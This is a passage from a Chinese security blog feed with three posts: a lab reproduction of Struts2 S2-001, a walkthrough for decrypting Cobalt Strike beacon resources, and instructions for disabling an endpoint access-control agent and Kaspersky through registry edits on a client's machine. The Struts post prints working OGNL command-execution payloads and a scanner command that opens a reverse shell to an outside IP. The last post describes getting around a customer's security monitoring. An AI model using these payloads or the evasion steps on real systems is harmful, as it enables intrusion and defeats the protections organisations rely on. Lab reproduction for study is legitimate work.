    <content type="html"><![CDATA[<h3 id="漏洞详情">漏洞详情</h3><p>​<a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p>​由于OGNL表达式的递归执行，造成了命令执行。</p><h3 id="环境搭建">环境搭建</h3><p>​Kali Linux</p><p>​IntelliJ Idea 2020.3.2</p><p>​Apache-Tomcat/9.0.43</p><p>​Java Open JDK 8</p><p>先给IDEA装struts 2插件：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3Efe.png" alt=""></p><p>新建项目：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3eld.png" alt=""></p><p>下载strust2 jar，解压提取lib内的jar。</p><p><a href="https://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip">https://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">commons-logging-1.0.4.jar<br>freemarker-2.3.4.jar<br>ognl-2.6.7.jar<br>struts2-api-2.0.1.jar<br>struts2-core-2.0.1.jar<br>xwork-2.0-beta-1.jar<br></code></pre></td></tr></table></figure><p>在 <code>WEB-INF</code> 下创建 <code>lib</code> 目录，放入所需的jar包。</p><p>导入依赖包到项目中：</p><p>​左键IDEA左上角，文件-项目结构-模块 添加依赖的jar，勾选然后确定。</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3ZSH.png" alt=""></p><p><code>src</code> 下新建 <code>com.demo.action</code> 包，包下再新建 <code>LoginAction</code>  java类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ActionSupport</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.isEmpty()) || (<span class="hljs-built_in">this</span>.password.isEmpty())) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>))<br>                &amp;&amp; (<span class="hljs-built_in">this</span>.password.equals(<span class="hljs-string">&quot;admin&quot;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>src</code> 目录下新建 <code>struts.xml</code> ，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;S2-001&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.demo.action.LoginAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>welcome.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>web</code> 目录下新建 <code>welcome.jsp</code> 文件,内容如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-<span class="hljs-number">001</span>&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;Hello &lt;s:property value=<span class="hljs-string">&quot;username&quot;</span>&gt;&lt;/s:property&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>修改 <code>index.jsp</code> 文件内容：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-<span class="hljs-number">001</span>&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-<span class="hljs-number">001</span> Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;</span><br>&lt;/p&gt;<br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;username&quot;</span>/&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span>/&gt;<br>    &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>修改 <code>web.xml</code> 文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>S2-001 Example<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行/调试配置，配置好jdk/tomcat所在目录：</p><p>构建项目然后运行（可以选择D bug模式），访问web页面：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3Kmt.png" alt=""></p><h3 id="复现attack">复现attack</h3><p>​验证，password输入<code>%&#123;6+6&#125;</code> 提交执行返回 <code>12</code>,即表示OGNL表达式被执行，漏洞存在。</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3M0P.png" alt=""></p><p>使用以下Payload执行下命令查看下web路径？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#req=<span class="hljs-meta">@org</span>.apache.struts2.ServletActionContext<span class="hljs-meta">@getRequest()</span>,#response=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="hljs-string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/03/27/6x3QTf.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/27/6x31k8.png" alt=""></p><p>OWASP ZAP用不习惯，直接用 <code>HackBar</code> 吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#a=(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]&#123;<span class="hljs-string">&quot;id&quot;</span>&#125;)).redirectErrorStream(<span class="hljs-literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(#b),#d=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(#c),#e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">50000</span>],#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/03/27/6x3nOI.png" alt=""></p><p>使用工具</p><p><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 Struts2Scan.py -u http://localhost:8080/S2_001_war_exploded/login.action -d <span class="hljs-string">&quot;name=admin&amp;password=&#123;exp&#125;&quot;</span> -n <span class="hljs-string">&quot;S02-001&quot;</span> --<span class="hljs-built_in">exec</span><br></code></pre></td></tr></table></figure><p>漏洞存在，但不支持利用？</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3rhF.png" alt=""></p><p>修改脚本1502行即可正常运行：<br><code>if name not in s2_list:</code> 为 <code> if name not in s2_dict:</code></p><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Tools/Sturts2/Struts2-Scan]<br>└─$ python3 Struts2Scan.py -u http://localhost:8080/S2_001_war_exploded/login.action -n S2-001 --reverse 192.168.176.1:8000  <br><br> ____  _              _       ____    ____                                                                              <br>/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __                                                              <br>\___ \| __| <span class="hljs-string">&#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;</span>_ \                                                             <br> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |                                                            <br>|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|                                                            <br>                                                                                                                        <br>                                      Author By HatBoy                                                                  <br>                                                                                                                        <br>[*] 请在反弹地址处监听端口如: nc -lvvp 8080<br><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/03/27/6x3BkT.png" alt=""></p><h3 id="漏洞分析">漏洞分析</h3><p>​略</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2007-4556</tag>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CsdecryptBeacon</title>
    <link href="/posts/a53b1765.html"/>
    <url>/posts/a53b1765.html</url>
    
    <content type="html"><![CDATA[<h3 id="CS-beacon资源解密">CS beacon资源解密</h3><p>原文 <a href="https://xz.aliyun.com/t/9224">https://xz.aliyun.com/t/9224</a></p><p>解压 CS 核心文件 <code>cobaltstrike.jar</code> 提内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p CSDecrypt/src<br>unzip CobaltStrike4.1/cobaltstrike.jar -d CSDecrypt/src<br><span class="hljs-built_in">cd</span> CSDecrypt/src<br><span class="hljs-built_in">touch</span> Csdecrypt.java<br></code></pre></td></tr></table></figure><p>解密脚本 <code>Csdecrypt.java</code> 代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Chang Author: kali</span><br><span class="hljs-keyword">import</span> common.SleevedResource;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Csdecrypt</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveFile</span><span class="hljs-params">(String filename, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> filename;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br>            <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>                file.delete();<br>            &#125;<br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>            fos.write(data, <span class="hljs-number">0</span>, data.length);<br>            fos.flush();<br>            fos.close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(File f) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>((<span class="hljs-type">int</span>) f.length());<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(f));<br>            <span class="hljs-type">int</span> <span class="hljs-variable">buf_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1024</span>;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[buf_size];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (-<span class="hljs-number">1</span> != (len = in.read(buffer, <span class="hljs-number">0</span>, buf_size))) &#123;<br>                bos.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            <span class="hljs-keyword">return</span> bos.toByteArray();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                in.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            bos.close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] var0)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] csdecrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">1</span>, -<span class="hljs-number">55</span>, -<span class="hljs-number">61</span>, <span class="hljs-number">127</span>, <span class="hljs-number">102</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">27</span>, -<span class="hljs-number">27</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">82</span>, -<span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">92</span>, <span class="hljs-number">51</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">114</span>, -<span class="hljs-number">118</span>, <span class="hljs-number">28</span>, -<span class="hljs-number">74</span>, <span class="hljs-number">103</span>, -<span class="hljs-number">53</span>, <span class="hljs-number">6</span>&#125;;<br><br>        SleevedResource.Setup(csdecrypt);<br>        <span class="hljs-type">byte</span>[] var7 = <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/home/kali/Desktop/CSDecrypt/src/sleeve&quot;</span>);<br>        File[] fs = file.listFiles();<br><br>        <span class="hljs-keyword">for</span> (File ff : fs) &#123;<br>            <span class="hljs-keyword">if</span> (!ff.isDirectory())<br>                var7 = SleevedResource.readResource(ff.getPath());<br>            saveFile(<span class="hljs-string">&quot;/home/kali/Desktop/CSDecrypt/src/sleevedecrypt/&quot;</span> + ff.getName(), var7);<br>            System.out.println(<span class="hljs-string">&quot;解密成功: &quot;</span> + ff.getName());<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Javac 编译然后执行 <code>.class</code> 文件开始解密资源：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>Csdecrypt.<span class="hljs-keyword">java</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java </span>Csdecrypt<br></code></pre></td></tr></table></figure><p>(o゜▽゜)o☆[BINGO!]</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>禁用联软准入助手&amp;卡巴斯基</title>
    <link href="/posts/d73c51dd.html"/>
    <url>/posts/d73c51dd.html</url>
    
    <content type="html"><![CDATA[<p>在某地驻场，客户要求装联软准入助手和卡巴。装上了它就被监控着了，而且打开一些非“正规”授权的软件都会遭受它的拦截。卡巴斯基则是把电脑中“不安全”的软件、脚本杀得片甲不留…</p><p><img src="https://s1.ax1x.com/2020/10/14/041IaT.png" alt=""></p><h3 id="前置条件">前置条件</h3><p>PE启动盘一个</p><h3 id="Start">Start</h3><p>进PE，使用PE注册表加载系统注册表文件（不懂请自行Google），名称随意，修改前注意备份。</p><p>联软准入助手:</p><p>注册表文件：<code>C:\Windows\System32\config\SYSTEM</code></p><p><img src="https://s1.ax1x.com/2020/10/14/041bRJ.png" alt=""></p><p>修改 <code>UniAccessAgent</code>、<code>UniAccessAgentDaemon</code>、<code>UniKInject</code> 项的 <code>Start</code> 为手动或者禁用，即3或者4：</p><p><img src="https://s1.ax1x.com/2020/10/14/041HG4.png" alt=""></p><p>卡巴斯基</p><p>修改 <code>AVP</code>、<code>avpsus</code>、<code>klnagent</code> 项</p><p><img src="https://s1.ax1x.com/2020/10/14/041oIU.png" alt=""></p><p>修改完，菜单点击文件－卸载配置单元，重启电脑即可。</p><p><img src="https://s1.ax1x.com/2020/10/14/0417iF.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cracked</tag>
      
      <tag>Something</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMware安装MacOS-MK-unlocker</title>
    <link href="/posts/84701d9e.html"/>
    <url>/posts/84701d9e.html</url>
    
